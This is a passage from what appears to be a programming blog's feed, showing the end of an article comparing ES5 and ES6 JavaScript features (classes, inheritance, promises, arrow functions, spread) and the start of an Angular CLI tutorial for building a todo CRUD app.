class="keyword">this</span>.name + <span class="string">' makes a noise.'</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> MyConstructor;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> animal = <span class="keyword">new</span> Animal(<span class="string">'animal'</span>);</span><br><span class="line">animal.speak(); <span class="comment">// animal makes a noise.</span></span><br></pre></td></tr></table></figure>
<p>In ES6, we have some syntax sugar. We can do the same with less boiler plate and new keywords such as <code>class</code> and <code>constructor</code>. Also, notice how clearly we define methods <code>constructor.prototype.speak = function ()</code> vs <code>speak()</code>:</p>
<figure class="highlight js"><figcaption><span>ES6</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line marked"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line marked">  <span class="keyword">constructor</span>(name) &#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">  &#125;</span><br><span class="line marked">  speak() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name + <span class="string">' makes a noise.'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> animal = <span class="keyword">new</span> Animal(<span class="string">'animal'</span>);</span><br><span class="line">animal.speak(); <span class="comment">// animal makes a noise.</span></span><br></pre></td></tr></table></figure>
<p>As we saw, both styles (ES5/6) produces the same results behind the scenes and are used in the same way.</p>
<blockquote>
<p>Best practices:</p>
<ul>
<li>Always use <code>class</code> syntax and avoid manipulating the <code>prototype</code> directly. Why? because it makes the code more concise and easier to understand.</li>
<li>Avoid having an empty constructor. Classes have a default constructor if one is not specified.</li>
</ul>
</blockquote>
<h2 id="Inheritance">Inheritance<a href="#Inheritance" class="headerlink" title="Inheritance"></a></h2><p>Building on the previous <code>Animal</code> class. Let‚Äôs say we want to extend it and define a <code>Lion</code> class</p>
<p>In ES5, It‚Äôs a little more involved with prototypal inheritance.</p>
<figure class="highlight js"><figcaption><span>ES5</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Lion = (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">MyConstructor</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line marked">    Animal.call(<span class="keyword">this</span>, name);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// prototypal inheritance</span></span><br><span class="line marked">  MyConstructor.prototype = <span class="built_in">Object</span>.create(Animal.prototype);</span><br><span class="line marked">  MyConstructor.prototype.constructor = Animal;</span><br><span class="line"></span><br><span class="line">  MyConstructor.prototype.speak = <span class="function"><span class="keyword">function</span> <span class="title">speak</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line marked">    Animal.prototype.speak.call(<span class="keyword">this</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name + <span class="string">' roars ü¶Å'</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> MyConstructor;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> lion = <span class="keyword">new</span> Lion(<span class="string">'Simba'</span>);</span><br><span class="line">lion.speak(); <span class="comment">// Simba makes a noise.</span></span><br><span class="line"><span class="comment">// Simba roars.</span></span><br></pre></td></tr></table></figure>
<p>I won‚Äôt go over all details but notice:</p>
<ul>
<li>Line 3, we explicitly call <code>Animal</code> constructor with the parameters.</li>
<li>Line 7-8, we assigned the <code>Lion</code> prototype to <code>Animal</code>‚Äòs prototype.</li>
<li>Line 11, we call the <code>speak</code> method from the parent class <code>Animal</code>.</li>
</ul>
<p>In ES6, we have a new keywords <code>extends</code> and <code>super</code> <img src="/images/superman_shield.svg" width="25" height="25" alt="superman shield" style="display:inline-block;">.</p>
<figure class="highlight js"><figcaption><span>ES6</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Lion</span> <span class="keyword">extends</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">  speak() &#123;</span><br><span class="line marked">    <span class="keyword">super</span>.speak();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name + <span class="string">' roars ü¶Å'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> lion = <span class="keyword">new</span> Lion(<span class="string">'Simba'</span>);</span><br><span class="line">lion.speak(); <span class="comment">// Simba makes a noise.</span></span><br><span class="line"><span class="comment">// Simba roars.</span></span><br></pre></td></tr></table></figure>
<p>Looks how legible this ES6 code looks compared with ES5 and they do exactly the same. Win!</p>
<blockquote>
<p>Best practices:</p>
<ul>
<li>Use the built-in way for inherintance with <code>extends</code>.</li>
</ul>
</blockquote>
<h2 id="Native-Promises">Native Promises<a href="#Native-Promises" class="headerlink" title="Native Promises"></a></h2><p>We went from callback hell üëπ to promises üôè</p>
<figure class="highlight js"><figcaption><span>ES5</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printAfterTimeout</span>(<span class="params">string, timeout, done</span>)</span>&#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line marked">    done(string);</span><br><span class="line">  &#125;, timeout);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">printAfterTimeout(<span class="string">'Hello '</span>, <span class="number">2e3</span>, <span class="function"><span class="keyword">function</span>(<span class="params">result</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(result);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// nested callback</span></span><br><span class="line marked">  printAfterTimeout(result + <span class="string">'Reader'</span>, <span class="number">2e3</span>, <span class="function"><span class="keyword">function</span>(<span class="params">result</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(result);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>We have one function that receives a callback to execute when is <code>done</code>. We have to execute it twice one after another. That‚Äôs why we called the 2nd time <code>printAfterTimeout</code> in the callback.</p>
<p>This can get messy pretty quickly if you need a 3rd or 4th callback. Let‚Äôs see how we can do it with promises:</p>
<figure class="highlight js"><figcaption><span>ES6</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printAfterTimeout</span>(<span class="params">string, timeout</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line marked">      resolve(string);</span><br><span class="line">    &#125;, timeout);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">printAfterTimeout(<span class="string">'Hello '</span>, <span class="number">2e3</span>).then(<span class="function">(<span class="params">result</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(result);</span><br><span class="line marked">  <span class="keyword">return</span> printAfterTimeout(result + <span class="string">'Reader'</span>, <span class="number">2e3</span>);</span><br><span class="line"></span><br><span class="line marked">&#125;).then(<span class="function">(<span class="params">result</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(result);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>As you can see, with promises we can use <code>then</code> to do something after another function is done. No more need to keep nesting functions.</p>
<h2 id="Arrow-functions">Arrow functions<a href="#Arrow-functions" class="headerlink" title="Arrow functions"></a></h2><p>ES6 didn‚Äôt remove the function expressions but it added a new one called arrow functions.</p>
<p>In ES5, we have some issues with <code>this</code>:</p>
<figure class="highlight js"><figcaption><span>ES5</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line marked"><span class="keyword">var</span> _this = <span class="keyword">this</span>; <span class="comment">// need to hold a reference</span></span><br><span class="line"></span><br><span class="line">$(<span class="string">'.btn'</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line marked">  _this.sendData(); <span class="comment">// reference outer this</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$(<span class="string">'.input'</span>).on(<span class="string">'change'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.sendData(); <span class="comment">// reference outer this</span></span><br><span class="line marked">&#125;.bind(<span class="keyword">this</span>)); <span class="comment">// bind to outer this</span></span><br></pre></td></tr></table></figure>
<p>You need to use a temporary <code>this</code> to reference inside a function or use <code>bind</code>. In ES6, you can use the arrow function!</p>
<figure class="highlight js"><figcaption><span>ES6</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// this will reference the outer one</span></span><br><span class="line marked">$(<span class="string">'.btn'</span>).click(<span class="function">(<span class="params">event</span>) =&gt;</span>  <span class="keyword">this</span>.sendData());</span><br><span class="line"></span><br><span class="line"><span class="comment">// implicit returns</span></span><br><span class="line"><span class="keyword">const</span> ids = [<span class="number">291</span>, <span class="number">288</span>, <span class="number">984</span>];</span><br><span class="line marked"><span class="keyword">const</span> messages = ids.map(<span class="function"><span class="params">value</span> =&gt;</span> <span class="string">`ID is <span class="subst">$&#123;value&#125;</span>`</span>);</span><br></pre></td></tr></table></figure>
<h2 id="For‚Ä¶of">For‚Ä¶of<a href="#For‚Ä¶of" class="headerlink" title="For‚Ä¶of"></a></h2><p>We went from <code>for</code> to <code>forEach</code> and then to <code>for...of</code>:</p>
<figure class="highlight javascript"><figcaption><span>ES5</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// for</span></span><br><span class="line"><span class="keyword">var</span> array = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; array.length; i++) &#123;</span><br><span class="line">  <span class="keyword">var</span> element = array[i];</span><br><span class="line">  <span class="built_in">console</span>.log(element);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// forEach</span></span><br><span class="line">array.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">element</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(element);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>The ES6 for‚Ä¶of also allow us to do iterations.</p>
<figure class="highlight javascript"><figcaption><span>ES6</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// for ...of</span></span><br><span class="line"><span class="keyword">const</span> array = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> element <span class="keyword">of</span> array) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(element);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Default-parameters">Default parameters<a href="#Default-parameters" class="headerlink" title="Default parameters"></a></h2><p>We went from checking if the variable was defined to assign a value to <code>default parameters</code>. Have you done something like this before?</p>
<figure class="highlight js"><figcaption><span>ES5</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">point</span>(<span class="params">x, y, isFlag</span>)</span>&#123;</span><br><span class="line marked">  x = x || <span class="number">0</span>;</span><br><span class="line marked">  y = y || <span class="number">-1</span>;</span><br><span class="line marked">  isFlag = isFlag || <span class="literal">true</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(x,y, isFlag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line marked">point(<span class="number">0</span>, <span class="number">0</span>) <span class="comment">// 0 -1 true üò±</span></span><br><span class="line marked">point(<span class="number">0</span>, <span class="number">0</span>, <span class="literal">false</span>) <span class="comment">// 0 -1 true üò±üò±</span></span><br><span class="line">point(<span class="number">1</span>) <span class="comment">// 1 -1 true</span></span><br><span class="line">point() <span class="comment">// 0 -1 true</span></span><br></pre></td></tr></table></figure>
<p>Probably yes, it‚Äôs a common pattern to check is the variable has a value or assign a default. Yet, notice there are some issues:</p>
<ul>
<li>Line 8, we pass <code>0, 0</code> and get <code>0, -1</code></li>
<li>Line 9, we pass <code>false</code> but get <code>true</code>.</li>
</ul>
<p>If you have a boolean as a default parameter or set the value to zero, it doesn‚Äôt work. Do you know why??? I‚Äôll tell you after the ES6 example ;)</p>
<p>With ES6, Now you can do better with less code!</p>
<figure class="highlight js"><figcaption><span>ES6</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line marked"><span class="function"><span class="keyword">function</span> <span class="title">point</span>(<span class="params">x = <span class="number">0</span>, y = <span class="number">-1</span>, isFlag = true</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(x,y, isFlag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line marked">point(<span class="number">0</span>, <span class="number">0</span>) <span class="comment">// 0 0 true</span></span><br><span class="line marked">point(<span class="number">0</span>, <span class="number">0</span>, <span class="literal">false</span>) <span class="comment">// 0 0 false</span></span><br><span class="line">point(<span class="number">1</span>) <span class="comment">// 1 -1 true</span></span><br><span class="line">point() <span class="comment">// 0 -1 true</span></span><br></pre></td></tr></table></figure>
<p>Notice line 5 and 6 we get the expected results. The ES5 example didn‚Äôt work. We have to check for <code>undefined</code> first since <code>false</code>, <code>null</code>, <code>undefined</code> and <code>0</code> are falsy values. We can get away with numbers:</p>
<figure class="highlight js"><figcaption><span>ES5</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">point</span>(<span class="params">x, y, isFlag</span>)</span>&#123;</span><br><span class="line">  x = x || <span class="number">0</span>;</span><br><span class="line marked">  y = <span class="keyword">typeof</span>(y) === <span class="string">'undefined'</span> ? <span class="number">-1</span> : y;</span><br><span class="line marked">  isFlag = <span class="keyword">typeof</span>(isFlag) === <span class="string">'undefined'</span> ? <span class="literal">true</span> : isFlag;</span><br><span class="line">  <span class="built_in">console</span>.log(x,y, isFlag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line marked">point(<span class="number">0</span>, <span class="number">0</span>) <span class="comment">// 0 0 true</span></span><br><span class="line marked">point(<span class="number">0</span>, <span class="number">0</span>, <span class="literal">false</span>) <span class="comment">// 0 0 false</span></span><br><span class="line">point(<span class="number">1</span>) <span class="comment">// 1 -1 true</span></span><br><span class="line">point() <span class="comment">// 0 -1 true</span></span><br></pre></td></tr></table></figure>
<p>Now it works as expected when we check for <code>undefined</code>.</p>
<h2 id="Rest-parameters">Rest parameters<a href="#Rest-parameters" class="headerlink" title="Rest parameters"></a></h2><p>We went from arguments to rest parameters and spread operator.</p>
<p>On ES5, it‚Äôs clumpsy to get an arbitrary number of arguments:
<figure class="highlight js"><figcaption><span>ES5</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printf</span>(<span class="params">format</span>) </span>&#123;</span><br><span class="line marked">  <span class="keyword">var</span> params = [].slice.call(<span class="built_in">arguments</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'params: '</span>, params);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'format: '</span>, format);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">printf(<span class="string">'%s %d %.2f'</span>, <span class="string">'adrian'</span>, <span class="number">321</span>, <span class="built_in">Math</span>.PI);</span><br></pre></td></tr></table></figure></p>
<p>We can do the same using the  rest operator <code>...</code>.</p>
<figure class="highlight js"><figcaption><span>ES6</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line marked"><span class="function"><span class="keyword">function</span> <span class="title">printf</span>(<span class="params">format, ...params</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'params: '</span>, params);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'format: '</span>, format);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">printf(<span class="string">'%s %d %.2f'</span>, <span class="string">'adrian'</span>, <span class="number">321</span>, <span class="built_in">Math</span>.PI);</span><br></pre></td></tr></table></figure>
<h2 id="Spread-operator">Spread operator<a href="#Spread-operator" class="headerlink" title="Spread operator"></a></h2><p>We went from <code>apply()</code> to the spread operator. Again we have <code>...</code> to the rescue:</p>
<blockquote>
<p>Reminder: we use <code>apply()</code> to convert an array into a list of arguments. For instance, <code>Math.max()</code> takes a list of parameters, but if we have an array we can use <code>apply</code> to make it work.</p>
</blockquote>
<img src="/images/javascript-math-apply-arrays.png" title="JavaScript Math apply for arrays">
<p>As we saw in earlier, we can use <code>apply</code> to pass arrays as list of arguments:</p>
<figure class="highlight js"><figcaption><span>ES5</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Math</span>.max.apply(<span class="built_in">Math</span>, [<span class="number">2</span>,<span class="number">100</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">43</span>]) <span class="comment">// 100</span></span><br></pre></td></tr></table></figure>
<p>In ES6, you can use the spread operator:</p>
<figure class="highlight js"><figcaption><span>ES6</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Math</span>.max(...[<span class="number">2</span>,<span class="number">100</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">43</span>]) <span class="comment">// 100</span></span><br></pre></td></tr></table></figure>
<p>Also, we went from <code>concat</code> arrays to use spread operator:</p>
<figure class="highlight js"><figcaption><span>ES5</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> array1 = [<span class="number">2</span>,<span class="number">100</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">43</span>];</span><br><span class="line"><span class="keyword">var</span> array2 = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>];</span><br><span class="line"><span class="keyword">var</span> array3 = [<span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">null</span>, <span class="literal">undefined</span>];</span><br><span class="line"></span><br><span class="line marked"><span class="built_in">console</span>.log(array1.concat(array2, array3));</span><br></pre></td></tr></table></figure>
<p>In ES6, you can flatten nested arrays using the spread operator:</p>
<figure class="highlight js"><figcaption><span>ES6</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> array1 = [<span class="number">2</span>,<span class="number">100</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">43</span>];</span><br><span class="line"><span class="keyword">const</span> array2 = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>];</span><br><span class="line"><span class="keyword">const</span> array3 = [<span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">null</span>, <span class="literal">undefined</span>];</span><br><span class="line"></span><br><span class="line marked"><span class="built_in">console</span>.log([...array1, ...array2, ...array3]);</span><br></pre></td></tr></table></figure>
<h1 id="Conclusion">Conclusion<a href="#Conclusion" class="headerlink" title="Conclusion"></a></h1><p>JavaScript has gone through a lot of changes. This article covers most of the core features that every JavaScript developer should know. Also, we cover some best practices to make your code more concise and easier to reason about.</p>
<p>If you think there are some other MUST KNOW feature let me know in the comments below and I will update this article.</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;JavaScript has changed quite a bit in the last years. These are 12 new features that you can start using today!&lt;/p&gt;
&lt;h1 id=&quot;JavaScript-Hi
    
    </summary>
    
      <category term="Programming" scheme="https://adrianmejia.com/categories/Programming/"/>
    
      <category term="Web Development" scheme="https://adrianmejia.com/categories/Programming/Web-Development/"/>
    
    
      <category term="javascript" scheme="https://adrianmejia.com/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>Angular Tutorial: Create a CRUD App with Angular CLI and TypeScript</title>
    <link href="https://adrianmejia.com/blog/2016/10/01/Angular-2-Tutorial-Create-a-CRUD-App-with-Angular-CLI-and-TypeScript/"/>
    <id>https://adrianmejia.com/blog/2016/10/01/Angular-2-Tutorial-Create-a-CRUD-App-with-Angular-CLI-and-TypeScript/</id>
    <published>2016-10-01T21:16:03.000Z</published>
    <updated>2018-08-07T22:17:23.000Z</updated>
    
    <content type="html"><![CDATA[<p>This tutorial gets you off the ground with Angular. We are going to use the official CLI (command line) tool to generate boilerplate code.</p>
<h1 id="Prerequisites">Prerequisites<a href="#Prerequisites" class="headerlink" title="Prerequisites"></a></h1><p>This tutorial is targeted to people familiar with JavaScript and HTML/CSS. You also will need:</p>
<ul>
<li>Node.js up and running.</li>
<li>NPM (Node package manager) or Yarn installed.</li>
</ul>
<p>You can verify by typing:
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">node --version</span><br><span class="line"><span class="comment"># v10.8.0</span></span><br><span class="line">npm --version</span><br><span class="line"><span class="comment"># 6.2.0</span></span><br></pre></td></tr></table></figure></p>
<p>If you get the versions Node 4.x.x and NPM 3.x.x. or higher you are all set. If not you have to get the latest versions.</p>
<p>Let‚Äôs move on to Angular. We are going to create a Todo app. We will be able to CRUD (create-read-update-delete) tasks:</p>
<ul>
<li>Live Demo: <a href="https://amejiarosario.github.io/angular-todo-app/" target="_blank" rel="noopener">Angular Todo app preview</a></li>
<li>Repository <a href="https://github.com/amejiarosario/angular-todo-app" target="_blank" rel="noopener">angular-todo-app</a></li>
</ul>
<h1 id="Understanding-ng-new">Understanding ng new<a href="#Understanding-ng-new" class="headerlink" title="Understanding ng new"></a></h1><p>Angular CLI is the best way to get us started. We can download the tool and create a new project by running:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># install angular-cli globally</span></span><br><span class="line">npm install -g @angular/cli@6.1.2</span><br><span class="line"><span class="comment"># npm install -g @angular/cli # get latest</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Check angular CLI is installed</span></span><br><span class="line">ng --version</span><br><span class="line"><span class="comment"># Angular CLI: 6.1.2</span></span><br></pre></td></tr></table></figure>
<p>If the versions don‚Äôt match then you can remove previously installed angular CLI with the following commands:
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm uninstall -g @angular/cli</span><br><span class="line">yarn global remove @angular/cli</span><br></pre></td></tr></table></figure></p>
<p>Once you have the right version, do:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># create a new project</span></span><br><span class="line">ng new Todos --style=scss</span><br></pre></td></tr></table></figure>
<p><strong>Note</strong> The last command takes some minutes. Leave it running and continue reading this tutorial.</p>
<p>The command <code>ng new</code> will do a bunch of things for us:</p>
<ol>
<li>Initialize a git repository</li>
<li>Creates an <code>package.json</code> files with all the Angular dependencies.</li>
<li>Setup TypeScript, Webpack, Tests (Jasmine, Protractor, Karma). Don‚Äôt worry if you don‚Äôt know what they are. We are going to cover them later.</li>
<li>It creates the <code>src</code> folder with the bootstrapping code to load our app into the browser</li>
<li>Finally, it does an <code>npm install</code> to get all the packages into <code>node_modules</code>.</li>
</ol>
<p>Let‚Äôs run the app!</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># builds the app and run it on port 9000</span></span><br><span class="line">ng serve ---port 9000</span><br></pre></td></tr></table></figure>
<p>Open your browser on <a href="http://localhost:9000/" target="_blank" rel="noopener">http://localhost:9000/</a>, and you should see ‚ÄúLoading‚Ä¶‚Äù and then it should switch to ‚ÄúWelcome to app!‚Äù. Awesome!</p>
<p>Now let‚Äôs dive into the <code>src</code> folder and get familiarized with the structure.</p>
<h2 id="package-json">package.json<a href="#package-json" class="headerlink" title="package.json"></a></h2><p>Open the <code>package.json</code> file and take a look at the dependencies. We have all the angular dependencies with the prefix <code>@angular/...</code>. Other dependencies are needed for Angular to run, such as RxJS, Zone.js, and some others. We are going to cover them in other posts.</p>
<h2 id="src-index-html">src/index.html<a href="#src-index-html" class="headerlink" title="src/index.html"></a></h2><p>We are building an SPA (single page application), so everything is going to be loaded into the <code>index.html</code>. Let‚Äôs take a look in the <code>src/index.html</code>. It‚Äôs pretty standard HTML5 code, except for two elements that are specific for our app:</p>
<ol>
<li><code>&lt;base href=&quot;/&quot;&gt;</code></li>
<li><code>&lt;app-root&gt;Loading...&lt;/app-root&gt;</code></li>
</ol>
<p><code>base href</code> is needed for Angular routing to work correctly. We are going to cover Routing later.</p>
<p><code>&lt;app-root&gt;</code> this is not a standard HTML tag. Our Angular App defines it. It‚Äôs an Angular <strong>component</strong>. More on this later.</p>
<h2 id="src-main-ts">src/main.ts<a href="#src-main-ts" class="headerlink" title="src/main.ts"></a></h2><p><code>main.ts</code> is where our application starts bootstrapping (loading). Angular can be used not just in browsers, but also on other platforms such as mobile apps or even desktop apps. So, when we start our application, we have to specify what platform we want to target. That‚Äôs why we import: <code>platform-browser-dynamic</code>. Notice that we are also importing the <code>AppModule</code> from <code>./app</code>.</p>
<p>The most important line is:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">platformBrowserDynamic().bootstrapModule(AppModule);</span><br></pre></td></tr></table></figure>
